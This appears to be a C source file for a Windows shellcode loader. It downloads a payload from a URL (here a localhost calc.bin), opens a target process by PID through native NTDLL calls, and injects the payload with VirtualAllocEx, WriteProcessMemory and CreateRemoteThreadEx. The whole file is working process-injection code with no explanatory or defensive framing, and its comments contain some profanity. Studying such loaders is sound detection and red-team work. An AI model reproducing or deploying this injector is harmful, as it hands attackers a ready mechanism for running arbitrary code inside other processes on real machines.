#include <Windows.h>
#include <wininet.h>
#include <stdio.h>
#include "debug.h"
#include "native.h"

#define NtCurrentHeap()            *(PVOID *)((DWORD_PTR)__readgsqword(0x60) + 0x30) //ProcessHeap

HMODULE GetMod(IN LPCWSTR modName) {
	HMODULE hModule = NULL;

	LOG_INFO("trying to open a handle to %S", modName);
	hModule = GetModuleHandleW(modName);

	if (hModule == NULL) {
		LOG_ERROR("failed to open a handle to the specified module, Error: 0x%lx", GetLastError());
		return 0;
	}
	else {
		LOG_SUCCESS("opened a handle to the specified module!");
		return hModule;
	}
}


int main(int argc, char* argv[]) {


	DWORD PID, TID, dwBytesRead = NULL;
	HANDLE hProcess, hThread = NULL;
	LPCWSTR sourceURL = L"http://127.0.0.1:8000/calc.bin";
	PBYTE pBytes = NULL;
	PBYTE pTmpBytes = NULL;
	PVOID hTmpHeap = NULL;
	PBYTE hHeap = NULL;
	SIZE_T sSize = NULL;
	LPVOID rBuffer = NULL;
	HINTERNET hInet, hURL = NULL;
	HMODULE hNTDLL = NULL;
	NTSTATUS STATUS = NULL;

	PBYTE* pPayloadBytes = NULL;
	SIZE_T* sPayloadBytes = NULL;

	if (argc < 2) {
		LOG_ERROR("Not enough arguments!");

		return 1;
	}

	hNTDLL = GetMod(L"NTDLL"); //open a handle to NTDLL
	PID = atoi(argv[1]);
	LOG_INFO("attempting to open a handle to the provided process (%ld)", PID);

	LOG_INFO("populating function prototypes");
	NtOpenProcess meowOpen = (NtOpenProcess)GetProcAddress(hNTDLL, "NtOpenProcess");
	NtCreateThreadEx meowThreadOpen = (NtCreateThreadEx)GetProcAddress(hNTDLL, "NtCreateThreadEx");
	NtClose meowClose = (NtClose)GetProcAddress(hNTDLL, "NtClose");
	// RtlCreateHeap meowCreateHeap = (RtlCreateHeap)GetProcAddress(hNTDLL, "RtlCreateHeap");
	// RtlAllocateHeap meowAllocateHeap = (RtlAllocateHeap)GetProcAddress(hNTDLL, "RtlAllocateHeap");
	// RtlFreeHeap meowFreeHeap = (RtlFreeHeap)GetProcAddress(hNTDLL, "RtlFreeHeap");
	// RtlDestroyHeap meowDestroyHeap = (RtlDestroyHeap)GetProcAddress(hNTDLL, "RtlDestroyHeap");
	LOG_SUCCESS("finished populating function prototypes");

	OBJECT_ATTRIBUTES OA = { sizeof(OA), NULL };
	CLIENT_ID CID = { (HANDLE)PID, NULL };

	// open a handle to the provided process
	STATUS = meowOpen(&hProcess, PROCESS_ALL_ACCESS, &OA, &CID);
	if (STATUS != STATUS_SUCCESS) {
		LOG_ERROR("[NtOpenProcess] failed to get a handle on the specified process, Error: 0x%lx", STATUS);
		return 1;
	}
	
	LOG_SUCCESS("opened a handle to the specified process! (%ld)", PID);
	LOG_INFO("\\___[ hProcess\n\t\t\_0x%p]", hProcess);

	// open handle to WinInet
	hInet = InternetOpenW(NULL, NULL, NULL, NULL, NULL);

	if (hInet == NULL) {
		LOG_ERROR("could not open a handle to hInet... Error: %ld", GetLastError());
		goto CLEANUP;
		return 1;
	}

	LOG_SUCCESS("successfully opened a handle to WinInet!");

	// open handle to payload's URL
	hURL = InternetOpenUrlW(hInet, sourceURL, NULL, NULL, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL);

	if (hURL == NULL) {
		LOG_ERROR("could not open a handle to URL... Error: %ld", GetLastError());
		CloseHandle(hInet);
		meowClose(hProcess);
		return 1;
	}

	LOG_SUCCESS("successfully opened a handle to the provided URL!");

	pTmpBytes = (PBYTE)LocalAlloc(LPTR, 1024);
	if (pTmpBytes == NULL) {
		LOG_ERROR("failed to allocate memory in temporary heap, Error: %ld", GetLastError());
		InternetCloseHandle(hURL);
		CloseHandle(hInet);
		meowClose(hProcess);
		return 1; // i am so fucking tired of error handling
	}

	LOG_SUCCESS("successfully allocated memory to temp buffer!\n\\---0x%p", pTmpBytes);

	// read data
	while (TRUE) {
		// read 1024 bytes to temp buffer
		if (!InternetReadFile(hURL, pTmpBytes, 1024, &dwBytesRead)) {
			LOG_ERROR("could not read contents of specified file... Error: %ld", GetLastError());
			LocalFree(pTmpBytes);
			InternetCloseHandle(hURL);
			CloseHandle(hInet);
			meowClose(hProcess);
			return 1;
		}

		// update size of the final buffer
		sSize += dwBytesRead;

		// allocate final buffer
		if (pBytes == NULL) {
			pBytes = (PBYTE)LocalAlloc(LPTR, dwBytesRead);
		}
		else {
			// if it wasn't NULL, reallocate it to == sSize
			pBytes = (PBYTE)LocalReAlloc(pBytes, sSize, LMEM_MOVEABLE | LMEM_ZEROINIT);
		}

		if (pBytes == NULL) {
			LocalFree(pBytes);
			LocalFree(pTmpBytes);
			InternetCloseHandle(hURL);
			CloseHandle(hInet);
			CloseHandle(hProcess);
			return 1; // as i said, i am sick and tired of error handling, get off my dick
		}

		// append the temp buffer to the end of the total buffer
		memcpy((PVOID)(pBytes + (sSize - dwBytesRead)), pTmpBytes, dwBytesRead);

		if (dwBytesRead < 1024) {
			break;
		}
	}

	// allocate memory for the payload copy
	pPayloadBytes = (PBYTE*)malloc(sSize);
	if (pPayloadBytes != NULL) {
		memcpy(pPayloadBytes, pBytes, sSize);
		LOG_SUCCESS("payload initialised\n\\---0x%p", pPayloadBytes);
	}

	// allocate memory for size
	sPayloadBytes = (size_t*)malloc(sizeof(size_t));
	if (sPayloadBytes != NULL) {
		*sPayloadBytes = sSize;
		LOG_SUCCESS("payload size initialised");
	}


	// clean up
	LOG_INFO("closing previously created inet handles and freeing memory");
	InternetCloseHandle(hInet);
	InternetCloseHandle(hURL);
	InternetSetOptionW(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);
	LocalFree(pTmpBytes);
	LocalFree(pBytes);
	LOG_SUCCESS("success");

	// allocate bytes in the memory of the specified process
	rBuffer = VirtualAllocEx(hProcess, NULL, sSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	if (rBuffer == NULL) {
		LOG_ERROR("could not allocate memory in host process... Error: %ld", GetLastError());
		meowClose(hProcess);
		free(pPayloadBytes);
		free(sPayloadBytes);
		return 1;
	}
	else {
		LOG_SUCCESS("allocated buffer in specified process");
	}

	// actually write to the memory of the specified process
	if (pPayloadBytes != NULL and sPayloadBytes != NULL) {
		WriteProcessMemory(hProcess, rBuffer, pPayloadBytes, *sPayloadBytes, NULL);
		LOG_SUCCESS("successfully wrote %zu-bytes to memory of specified process", sSize);
	}
	// create thread to run the payload
	hThread = CreateRemoteThreadEx(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)rBuffer, NULL, 0, 0, &TID);

	if (hThread != NULL) {
		LOG_ERROR("successfully opened a handle to created thread! (%ld)\n\\---0x%p", TID, hThread);
	}
	else {
		LOG_ERROR("could not open a handle to thread... Error: %ld", GetLastError());
		meowClose(hProcess);
		VirtualFree(rBuffer, 0, MEM_RELEASE);
		free(pPayloadBytes);
		free(sPayloadBytes);
		return 1;
	}

	WaitForSingleObject(hThread, INFINITE);
	LOG_SUCCESS("thread finished executing, cleaning up...");

	// clean up after yourself!
	meowClose(hProcess);
	CloseHandle(hThread);
	VirtualFree(rBuffer, 0, MEM_RELEASE);
	free(pPayloadBytes);
	free(sPayloadBytes);
	LOG_SUCCESS("closed handle to process");

CLEANUP:
	/*
	if (rBuffer) {
		STATUS = p_NtFreeVirtualMemory(ProcessHandle, &Buffer, &PayloadSize, MEM_DECOMMIT);
		if (STATUS_SUCCESS != Status) {
			PRINT_ERROR("NtFreeVirtualMemory", Status);
		}
		else {
			INFO("[0x%p] decommitted allocated buffer from process memory", Buffer);
		}
	}
	
	if (ThreadHandle) {
		p_NtClose(ThreadHandle);
		INFO("[0x%p] handle on thread closed", ThreadHandle);
	}
	*/
	if (hProcess) {
		meowClose(hProcess);
		LOG_INFO("[0x%p] handle on process closed", hProcess);
	}

	return 0;
}